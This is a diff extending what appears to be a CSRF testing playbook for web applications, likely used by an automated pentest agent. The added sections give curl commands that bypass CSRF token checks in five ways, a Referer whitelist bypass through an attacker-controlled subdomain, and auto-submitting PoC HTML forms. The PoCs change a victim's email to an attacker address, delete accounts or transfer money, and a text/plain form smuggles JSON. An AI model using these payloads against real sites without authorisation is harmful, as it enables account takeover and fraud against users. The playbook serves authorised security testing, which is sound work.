@@ -95,20 +95,43 @@ curl -s -X GET "https://target.com/api/account/email?email=attacker@evil.com" \
 
 ### Step 2 — Test CSRF token absence / non-validation
 
+Run through all five bypass attempts in order:
+
+1. **Omit** the CSRF token parameter entirely
+2. **Blank** value — send `csrf_token=`
+3. **Random** value — send `csrf_token=AAAAAAAAAA`
+4. **Same length** as the real token — some validators only check length
+5. **Cross-session reuse** — use token from a different authenticated user's session
+
 ```bash
-# Remove CSRF token from POST body and replay:
+# 1. Omit:
 curl -s -X POST "https://target.com/account/email" \
   -H "Cookie: session=VALID_SESSION" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "email=attacker%40evil.com"
-# Success response (200/302) without token = missing validation
 
-# Send wrong token value:
+# 2. Blank:
+curl -s -X POST "https://target.com/account/email" \
+  -H "Cookie: session=VALID_SESSION" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "email=attacker%40evil.com&csrf_token="
+
+# 3. Random:
 curl -s -X POST "https://target.com/account/email" \
   -H "Cookie: session=VALID_SESSION" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "email=attacker%40evil.com&csrf_token=INVALID_TOKEN_12345"
-# Success = token not validated
+
+# 4. Same length as real token — observe token length first, then match it:
+# (replace XXXX... with same number of chars as observed token)
+
+# 5. Cross-session: copy USER_A's token, use in USER_B's session request
+curl -s -X POST "https://target.com/account/email" \
+  -H "Cookie: session=USER_B_SESSION" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "email=attacker%40evil.com&csrf_token=USER_A_CSRF_TOKEN"
+
+# Any success → token not properly validated
 ```
 
 ### Step 3 — Test token not tied to session
@@ -163,7 +186,8 @@ curl -s -X POST "https://target.com/account/delete" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "confirm=yes"
 
-# No Referer header:
+# No Referer header (suppress via meta tag in PoC HTML):
+# <meta name="referrer" content="no-referrer">
 curl -s -X POST "https://target.com/account/delete" \
   --referer "" \
   -H "Cookie: session=VALID_SESSION" \
@@ -171,6 +195,31 @@ curl -s -X POST "https://target.com/account/delete" \
   -d "confirm=yes"
 
 # If server accepts requests with missing/null Referer = Referer-only check bypassable
+
+# Referer whitelist bypass — validator checks if legitimate domain appears in Referer:
+# Subdomain prefix:  legitimate.example.com.attacker.com  (passes suffix check)
+# Path suffix:       attacker.com/legitimate.example.com  (passes substring check)
+curl -s -X POST "https://target.com/account/delete" \
+  -H "Cookie: session=VALID_SESSION" \
+  -H "Referer: https://target.com.attacker.com/" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "confirm=yes"
+```
+
+**PoC HTML — suppress Referer with meta tag:**
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="referrer" content="no-referrer">
+  </head>
+  <body>
+    <form action="https://app.example.com/api/profile/update" method="POST">
+      <input type="hidden" name="new_email" value="attacker@example.com"/>
+    </form>
+    <script>history.pushState('','','/');document.forms[0].submit();</script>
+  </body>
+</html>
 ```
 
 ### Step 7 — Content-Type confusion (JSON endpoint bypass)
@@ -183,6 +232,39 @@ curl -s -X POST "https://target.com/api/transfer" \
   -H "Content-Type: text/plain" \
   -d '{"to":"attacker","amount":1000}'
 # text/plain does not trigger CORS preflight → no CSRF protection applied
+
+# Test: send form-encoded body to JSON-only endpoint — framework may still parse it:
+curl -s -X POST "https://target.com/api/transfer" \
+  -H "Cookie: session=VALID_SESSION" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "to=attacker&amount=1000"
+```
+
+**PoC: `text/plain` enctype with JSON reconstructed from name=value**
+
+When the server expects JSON but `text/plain` is accepted, encode the JSON body
+across the `name` and `value` fields of a hidden input — the browser sends `name=value`
+which reconstructs valid JSON server-side:
+
+```html
+<form action="https://app.example.com/api/profile/update" method="POST" enctype="text/plain">
+  <input type="hidden" name='{"test":"x' value='y","new_email":"attacker@example.com"}'/>
+</form>
+```
+Browser sends body: `{"test":"x=y","new_email":"attacker@example.com"}` — valid JSON.
+
+### Step 8 — HTTP method manipulation
+
+Endpoints using PUT/PATCH trigger CORS preflight (browser blocks cross-origin).
+Test whether the same operation is accepted via POST — HTML forms only support GET/POST,
+so a POST-accepting endpoint is directly exploitable from a basic CSRF form:
+
+```bash
+curl -s -X POST "https://target.com/api/profile/update" \
+  -H "Cookie: session=VALID_SESSION" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "new_email=attacker@evil.com"
+# If endpoint normally expects PUT/PATCH but accepts POST → CSRF is exploitable via form
 ```
 
 ## DYNAMIC CONFIRMATION
@@ -234,6 +316,22 @@ fetch('https://target.com/api/transfer', {
 </script>
 </body>
 </html>
+```
+
+## TOOLS
+
+```bash
+# Bolt — Python3 CSRF exploitation tool (web crawling + auto-exploitation)
+git clone https://github.com/s0md3v/Bolt
+python3 bolt.py -u https://target.com
+
+# XSRFProbe — advanced CSRF toolkit (crawling + extensive detection)
+pip install xsrfprobe
+xsrfprobe -u https://target.com
+
+# Burp Suite — CSRF PoC Creator extension: generates PoC HTML from captured requests
+# Install from BApp Store: "CSRF PoC Creator"
+# Or use built-in: right-click request → Engagement tools → Generate CSRF PoC
 ```
 
 ## REPORT_BUNDLE FIELDS
